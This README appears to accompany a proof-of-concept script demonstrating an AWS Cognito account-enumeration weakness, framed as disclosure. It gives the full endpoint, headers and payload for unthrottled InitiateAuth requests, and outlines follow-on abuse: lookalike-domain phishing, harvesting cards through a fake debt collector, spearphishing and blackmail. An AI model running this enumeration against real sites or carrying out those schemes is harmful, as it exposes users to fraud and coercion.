![image](https://github.com/JWally/ezp0wn/assets/2482935/9e6cdfba-4115-4a01-a0b0-cf9789681c87)


# AWS Cognito Account Enumeration Demonstration

This Node.js script demonstrates an account enumeration vulnerability with AWS Cognito.

## Summary

If your site uses AWS Cognito and your `clientId` is exposed:

I can run a script to see who has accounts on your site - without rate limits.

## Why Is This Bad?

I'm sure there are more, but here are two ways a threat actor could exploit this:

### Depth

With a list of emails, I can quickly see who is associated with your service. 
1. I can buy a domain that looks like yours
2. Create a login page that looks like yours
3. send emails tricking people to give me their credentials to your site.
  
If you're not using 2fa, I've taken over their account.

Easier, I can pretend to be a debt collector going after a small debt that's about to incur massive fees and penalties - just to harvest credit card numbers.

### Breadth

With a collection of `clientId`s, a threat actor could quickly see what websites an email address is associated with. 

With this, I can easily spearphishing campaign, or blackmail campaign depending on what I discover.

## How Does It Work?

Make as many rest requests as you want, as quick as you want with the following format:

### URL
`"https://cognito-idp.us-east-2.amazonaws.com/`

n.b. this might have to change depending on how the site set everything up

### Headers
```json
{
    "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
    "X-Amz-User-Agent": "aws-amplify/5.0.4 js",
    "Content-Type": "application/x-amz-json-1.1"
}
```

### Payload
```json
{
  "AuthFlow": "USER_SRP_AUTH",
  "ClientId": "5b6a*****umldkr",
  "AuthParameters": {
    "USERNAME": "hi@mom.com",
    "SRP_A": "66463ad244621e5365841583e54891c292b3be74a00bdd034c2d555cf4fe1faaa"
  },
  "ClientMetadata": {}
}
```
